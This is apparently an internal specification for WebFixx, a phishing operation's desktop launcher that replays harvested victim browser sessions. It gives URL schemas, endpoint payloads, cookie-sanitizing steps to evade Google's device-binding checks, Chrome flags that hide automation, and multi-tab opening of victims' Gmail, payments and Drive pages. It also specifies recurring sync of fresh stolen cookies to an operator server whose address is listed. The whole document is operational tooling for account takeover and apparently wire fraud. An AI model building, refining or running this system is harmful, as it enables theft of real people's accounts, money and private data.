# Session Protocol (WebFixx Multi-Tab Launcher)

Companion to `ARCHITECTURE.md` and `TEMPLATE_PROTOCOL.md`. This document is the **session surface & launcher protocol** specification for the WebFixx ecosystem: how harvested browser sessions are packaged, routed, validated, launched across multiple machines, hydrated with cookies, and kept synchronized over time.

---

## 1. System Map & Core Architecture

```
┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                 WEBFIXX SESSION LIFECYCLE                                       │
│                                                                                                 │
│  1. HARVEST (Engine)          2. PERSISTENCE (GAS / DB)        3. DISPATCH (Dashboard)          │
│  ┌──────────────────────┐     ┌───────────────────────┐        ┌─────────────────────────────┐  │
│  │ Headless Chrome VPS  │────>│ Google Sheets & Drive │───────>│ WebFixx Frontend            │  │
│  │ - Harvests tokens    │     │ - cookie sheet row    │        │ - Reads hubData             │  │
│  │ - Zips user profile  │     │ - Profile ZIP in Drive│        │ - Constructs webfixx:// URL │  │
│  │ - Staps owning server│     │ - 36 ecosystem URLs   │        │ - Preserves item.server     │  │
│  └──────────────────────┘     └───────────────────────┘        └──────────────┬──────────────┘  │
│                                                                               │                 │
│                                       webfixx://launch?browserId=...&token=...│                 │
│                                                                               ▼                 │
│  4. DESKTOP LAUNCHER (Windows Electron Application: desktop-multitab)                           │
│  ┌───────────────────────────────────────────────────────────────────────────────────────────┐  │
│  │ A. Validation: POST {browserId, token, launcherKey, username} -> /electron/session-data    │  │
│  │    (Direct fetch to owning server; falls back to production API if unreachable)          │  │
│  │                                                                                           │  │
│  │ B. Device Lock Guard: Verifies launcherKey against launchHistory (1-Device Rule)          │  │
│  │                                                                                           │  │
│  │ C. Profile Hydration:                                                                     │  │
│  │    - First Launch on this PC: Downloads ZIP -> extracts to %TEMP%\webfixx-sessions\<id>  │  │
│  │      -> Sanitizes machine-bound tokens (*PSIDTS, *SIDCC) -> Cleans VPS lock files         │  │
│  │    - Subsequent Launch on this PC: Reuses local Windows DPAPI SQLite store directly       │  │
│  │                                                                                           │  │
│  │ D. Automation & CDP Injection:                                                            │  │
│  │    - Spawns Chrome with --remote-debugging-port=0 and isolated user-data-dir             │  │
│  │    - Connects via Chrome DevTools Protocol (CDP) WebSocket                                │  │
│  │    - Ingests cookies via Network.setCookies (driveCookieJSON -> account -> base)          │  │
│  │    - Opens smart multi-tabs (Tab 1: Mail, Tab 2: Subscriptions, Tab 3: Drive)            │  │
│  │    - Settles Tab 1 (8s window, bringToFront, no disruptive reloads)                       │  │
│  │                                                                                           │  │
│  │ E. Live Synchronization Loop:                                                             │  │
│  │    - Initial sync at 15s + recurring sync every 60s + sync on close                      │  │
│  │    - Reads fresh tokens via CDP Network.getCookies -> POST /electron/sync-cookies         │  │
│  │    - Updates cookie sheet & hub formattedCookie/launchHistory safely                      │  │
│  └───────────────────────────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
```

The WebFixx architecture is anchored by three foundational documentation pillars:
1. `ARCHITECTURE.md`: Master system topology, limits, rate governance, and backend flows.
2. `TEMPLATE_PROTOCOL.md`: Phishing template surface, polling loops, and engine interaction.
3. `SESSION_PROTOCOL.md` (this document): Multi-tab desktop launcher protocol, cookie waterfalls, profile isolation, and multi-machine persistence.

---

## 2. Protocol Contracts & URL Schemas

### A. Custom URL Protocol (`webfixx://` and `webfixx-multi://`)

The dashboard initiates desktop session launches by triggering the registered protocol client.

**Protocol URI Format:**
```
webfixx://launch?browserId={browserId}&token={token}&api={apiUrl}&launcherKey={launcherKey}&username={username}
```

| Parameter | Type | Required | Description |
|---|---|---|---|
| `browserId` | String | Yes | Unique identifier for the harvested browser session (e.g., `browser-1793339891684-k36ovcudtx`). |
| `token` | String | Yes | User's active dashboard authentication token (used to verify permission). |
| `api` | URL-encoded | Yes | Direct URL of the server owning the session (`item?.server`). |
| `launcherKey` | String | Optional | Unique hardware-bound key of the desktop installation (`LK-<16 HEX>`). |
| `username` | String | Optional | Username of the logged-in user launching the session. |

### B. Session Validation Endpoint (`/electron/session-data`)

The launcher validates the session and retrieves cookie sets, URLs, and download targets.

- **Endpoints:**
  - `${base}/electron/session-data` (Serverless Engine / Headless instance)
  - `${base}/api/electron/session-data` (Python API / Production gateway)
- **Method:** `POST`
- **Request Headers:** `Content-Type: application/json`

**Request Body:**
```json
{
  "browserId": "browser-1793339891684-k36ovcudtx",
  "token": "eyJ1c2VySWQiOiJ1c3IwMSIsInJvbGUiOiJBRE1JTiJ9...",
  "launcherKey": "LK-600F1AC6EE4CAD44",
  "username": "admin_robert"
}
```

**Success Response (`200 OK`):**
```json
{
  "success": true,
  "downloadUrl": "https://drive.google.com/uc?export=download&id=1AbC...",
  "driveUrl": "https://drive.google.com/file/d/1AbC.../view",
  "domain": "gmail.com",
  "email": "user@gmail.com",
  "category": "WIRE",
  "platform": "GOOGLE",
  "platformUrl": "https://mail.google.com/mail/u/0/#inbox",
  "platformUrls": [
    "https://mail.google.com/mail/u/0/#inbox",
    "https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0",
    "https://drive.google.com/drive/u/0/my-drive"
  ],
  "cookieJSON": [ ... ],
  "accountCookieJSON": [ ... ],
  "driveCookieJSON": [ ... ],
  "browserIdentity": {
    "userAgent": "Mozilla/5.0 ...",
    "platform": "Win32",
    "language": "en-US"
  }
}
```

**Error Responses:**
- `400 Bad Request`: `{"error": "browserId and token are required"}`
- `401 Unauthorized`: `{"error": "Token validation failed"}`
- `403 Forbidden`: `{"error": "Access Denied: This session is locked to a different launcher installation."}`
- `404 Not Found`: `{"error": "Session not found for the given browserId"}`

### C. Live Cookie Synchronization Endpoint (`/electron/sync-cookies`)

While the session is running in Chrome, the launcher captures updated session tokens and syncs them back to the database.

- **Endpoints:** `${base}/electron/sync-cookies` or `${base}/api/electron/sync-cookies`
- **Method:** `POST`
- **Payload:**
```json
{
  "browserId": "browser-1793339891684-k36ovcudtx",
  "token": "...",
  "launcherKey": "LK-600F1AC6EE4CAD44",
  "cookies": [
    {
      "name": "SID",
      "value": "...",
      "domain": ".google.com",
      "path": "/",
      "expires": 1793339891,
      "httpOnly": false,
      "secure": true,
      "sameSite": "None"
    }
  ]
}
```

**Success Response:**
```json
{
  "success": true,
  "updatedCount": 26,
  "message": "Cookies synchronized successfully"
}
```

---

## 3. Platform & Multi-Tab URL Resolution

The launcher dynamically resolves the number of tabs and URLs to open based on the account provider:

```
Platform / Domain Detection
  ├── Google (Gmail, Google Workspace, @gmail.com, @googlemail.com)
  │     ├── Tab 1: https://mail.google.com/mail/u/0/#inbox
  │     ├── Tab 2: https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0
  │     └── Tab 3: https://drive.google.com/drive/u/0/my-drive
  │
  ├── Microsoft Free Consumer (outlook.com, hotmail.com, live.com, msn.com)
  │     └── Tab 1: https://outlook.live.com/mail/
  │
  ├── Microsoft Enterprise / Office 365 (custom domain business accounts)
  │     └── Tab 1: https://outlook.office.com/mail/
  │
  ├── Yahoo Mail (yahoo.com, ymail.com)
  │     └── Tab 1: https://mail.yahoo.com/
  │
  ├── AOL Mail (aol.com)
  │     └── Tab 1: https://mail.aol.com/
  │
  └── Custom Webmail Fallback
        └── Tab 1: https://{domain}
```

### Official Google 9-Dots URL Standardization
All Google ecosystem endpoints use official App Launcher paths with explicit account index parameters (`authuser=0` or `/u/0/`):
- Avoids ambiguous multi-login routing when local browser profiles already have personal Google accounts.
- Guarantees the injected session opens as Primary Account `0`.

---

## 4. The 4 Pillars of Cross-PC Session Longevity

Sessions generated in headless environments face anti-bot barriers when transferred to external Windows PCs. WebFixx solves this using a 4-pillar longevity model:

### Pillar 1: First-Launch Cross-PC Token Sanitization
When Google mints session tokens on Machine `A` (VPS), certain rolling and device-bound cookies contain cryptographic bindings to that specific network environment:
- `__Secure-1PSIDTS` and `__Secure-3PSIDTS` (Per-Session Timestamp signatures)
- `SIDCC`, `__Secure-1PSIDCC`, and `__Secure-3PSIDCC` (Security Identification Check Cookies)
- Regional ccTLD cookies (e.g., `.google.com.ng`)

**The Rule:** On **First Launch** on a new PC, the launcher sanitizes these tokens before injection:
1. Strips all `*PSIDTS` and `*SIDCC` cookies.
2. Strips regional `.google.com.*` variations, leaving pure `.google.com` root domains.
3. Injects the immutable master credentials: `SID`, `HSID`, `SSID`, `APISID`, `SAPISID`, `__Secure-1PSID`, `__Secure-3PSID`, `NID`, `CONSENT`, `AEC`.
4. Chrome connects to Google SSO (`accounts.google.com`), which cleanly recognizes the root `SID` and transparently mints fresh, local `PSIDTS` and `SIDCC` tokens natively bound to the user's local Windows PC. This completely eliminates the *"This browser or app may not be secure"* block.

### Pillar 2: Subsequent Launch Local DPAPI Reuse
Once an account has completed its First Launch on a machine:
1. Chrome encrypts the newly minted session tokens into the local Windows DPAPI SQLite database at:
   `%TEMP%\webfixx-sessions\<browserId>\Default\Network\Cookies`
2. On every **Subsequent Launch** on that same PC (`isFirstLaunch: false`):
   - The launcher skips remote cookie injection completely (`avoiding replay of database cookies`).
   - Chrome launches directly with its existing user-data-dir.
   - Preserves all fresh tokens, 2FA grants, and local state without overwriting them with older database copies.

### Pillar 3: Tab 1 Pacing & Anti-Thrashing
Opening 3 Google tabs simultaneously can trigger concurrent SSO handshakes against `accounts.google.com/CheckCookie`, causing token race conditions.
1. **Sequential Tab Creation**: Tab 1 is navigated first. Tabs 2 and 3 are created sequentially via CDP `Target.createTarget` with a 3000ms delay between each.
2. **Settling Window**: Tab 1 is given an 8000ms undisturbed settling window to allow Google service workers and authentication handshakes to conclude.
3. **No Hard Reloads**: Disruptive page reloads (`window.location.reload(true)`) are prohibited, ensuring in-flight OAuth handshakes are never interrupted.
4. **Foreground Focus**: `Page.bringToFront` is issued on Tab 1 so the primary inbox is visually foregrounded for the user.

### Pillar 4: 3-Tier Cookie Resolution Waterfall
When ingesting cookies, the launcher evaluates candidate token sets in priority order:
1. **Tier 1 (`driveCookieJSON` - 26 cookies)**: Comprehensive cross-service bundle containing tokens for `.google.com`, `mail.google.com`, `myaccount.google.com`, and `drive.google.com`.
2. **Tier 2 (`accountCookieJSON` - 22 cookies)**: Multi-service bundle containing root auth, mail, and Google account management.
3. **Tier 3 (`cookieJSON` / `formattedCookie` - 20 cookies)**: Initial authentication tokens harvested at login.

---

## 5. Browser Profile Lifecycle & File Isolation

Sessions are maintained in temporary, isolated directories on the host operating system:

```
%TEMP%\webfixx-sessions\
  ├── launcher-config.json              <-- Stores persistent local launcherKey
  └── browser-{timestamp}-{random}\     <-- Profile folder for specific session
      ├── DevToolsActivePort            <-- Dynamic debugging port file
      └── Default\
          ├── Network\
          │   └── Cookies               <-- Windows DPAPI encrypted cookie database
          ├── Preferences
          └── Storage\
```

### First Launch vs. Subsequent Launch Directory Handling

| Phase | First Launch (`destDir` does NOT exist) | Subsequent Launch (`destDir` exists) |
|---|---|---|
| **Download** | Downloads ZIP from `downloadUrl` (Google Drive or direct CDN). | Skipped completely (uses local cache). |
| **Extraction** | Extracts full profile tree into `destDir`. | Skipped. |
| **DPAPI Cookies** | Deletes extracted `Default/Network/Cookies` (cannot decrypt VPS tokens). | **Preserved 100% intact** (local Windows DPAPI tokens). |
| **Lock Cleanup** | Removes `DevToolsActivePort`, `lockfile`, `Singleton*`, `*.pma`. | Removes runtime lock files only. |
| **CDP Ingestion** | Sanitizes tokens and injects via `Network.setCookies`. | **Skipped** (preserves active local state). |

---

## 6. Chrome Automation & CDP Integration

The desktop launcher acts as a headless orchestrator, launching the system's local Google Chrome (or Microsoft Edge) binary and controlling it through the Chrome DevTools Protocol:

```
Launcher (Node.js) ─── Spawn Chrome ───> Chrome Process (--remote-debugging-port=0)
       │                                            │
       │ Reads port from DevToolsActivePort         │
       ▼                                            ▼
CDP Client (WebSocket) <─────────────── ws://127.0.0.1:<port>/devtools/page/<id>
       │
       ├── 1. Network.setCookies    (Injects sanitized plaintext cookies)
       ├── 2. Target.createTarget   (Opens Tab 2 & Tab 3 sequentially)
       ├── 3. Page.bringToFront     (Focuses Tab 1)
       └── 4. Network.getCookies    (Recurring background sync)
```

### Critical Chrome Launch Flags
```javascript
const chromeArgs = [
  `--user-data-dir=${destDir}`,
  `--remote-debugging-port=0`,             // Dynamic port allocation (avoids port collisions)
  '--no-first-run',
  '--no-default-browser-check',
  '--disable-blink-features=AutomationControlled', // Prevents navigator.webdriver detection
  '--disable-features=IsolateOrigins,site-per-process',
  '--start-maximized',
  '--disable-sync',                        // Disables personal Google profile sync
  targetUrls[0]                            // Tab 1 initial navigation
];
```

---

## 7. Security: Multi-Device Locking & Anti-Collision (1-Device Rule)

To prevent session hijacking or simultaneous conflicting sessions that would trigger Google fraud alerts, WebFixx enforces a hardware-level **1-Device Rule**:

1. **Hardware Fingerprint**: Upon installation, the launcher generates a permanent UUID key (`LK-<16 HEX>`) saved to `%TEMP%\webfixx-sessions\launcher-config.json`.
2. **Device Stamping**: On the first launch of a session, the server records the `launcherKey`, `username`, and timestamp into the `launchHistory` column in Google Sheets:
   ```json
   {
     "launcherKey": "LK-600F1AC6EE4CAD44",
     "username": "admin_robert",
     "firstLaunchedAt": "2026-10-30T17:40:00.000Z",
     "lastSyncedAt": "2026-10-30T17:45:00.000Z",
     "launchCount": 4
   }
   ```
3. **Hardware Lock Enforcement**: If a user on a different PC attempts to launch the same session, `/electron/session-data` validates the incoming `launcherKey`. If mismatched, the server rejects the request with:
   - **HTTP 403 Forbidden**
   - Error: `"Access Denied: This session is locked to a different launcher installation."`

---

## 8. Server Routing & Reliability

### Direct Server Routing
Each harvested session in the `hub` and `cookie` sheets contains a `server` column indicating the exact engine instance that processed the login.
- **Rule**: The dashboard passes `item?.server` directly in the `api` parameter of `webfixx://launch`.
- **Failover**: If the primary server is unreachable or offline, the launcher falls back gracefully to the production central API (`https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api`).
- **No Early Abort**: Network calls to Google Apps Script or database endpoints are never cancelled with aggressive short timers.

### Database Performance Optimization
In Google Apps Script (`WebFixx-Hoo`):
- `getSessionData` is registered in `noAppDataRebuildFunctions`.
- When fetching session data, Apps Script skips the full 20MB AppData rebuild (campaigns, templates, and links) and serves session cookies in under 500ms.
- Formula columns (`totalCredit`, `totalDebit`, `pendingBalance`, `balance`) are protected from overwrites during cookie and `launchHistory` synchronization.

---

## 9. Verification & Diagnostics Checklist

When validating a session launch in development or production:

1. **Launcher Key Verification:**
   - Confirm `%TEMP%\webfixx-sessions\launcher-config.json` contains a valid `LK-...` string.
2. **First Launch Test:**
   - Ensure `isFirstLaunch` logs:
     ```
     [INFO] First launch on this machine: downloading profile...
     [INFO] Applying Google session resilience on first launch: removing stale VPS lock and port artifacts...
     [INFO] [Pillar 1] Sanitized tokens: stripped machine-bound TS/CC cookies for cross-PC resilience.
     [INFO] [Pillar 4] Ingesting 26 cookies from driveCookieJSON into browser jar...
     ```
3. **Subsequent Launch Test:**
   - Close Chrome and re-open the session.
   - Confirm the log displays:
     ```
     [INFO] Existing profile directory found. Reusing local Windows DPAPI cookies & state.
     [INFO] Subsequent launch: preserving local Windows DPAPI cookies (avoiding replay of database cookies).
     ```
4. **Multi-Tab Check:**
   - Verify all 3 tabs load without sign-in prompts:
     - Tab 1: Gmail Inbox (`/mail/u/0/#inbox`)
     - Tab 2: Payments & Subscriptions (`/payments-and-subscriptions?authuser=0`)
     - Tab 3: Google Drive (`/drive/u/0/my-drive`)
5. **Cookie Sync Check:**
   - Wait 15 seconds after launch.
   - Confirm: `[INFO] [Pillar 2] Synced 26 live cookies to server.`
   - Confirm `cookie` sheet row updates `launchHistory` with updated `lastSyncedAt`.
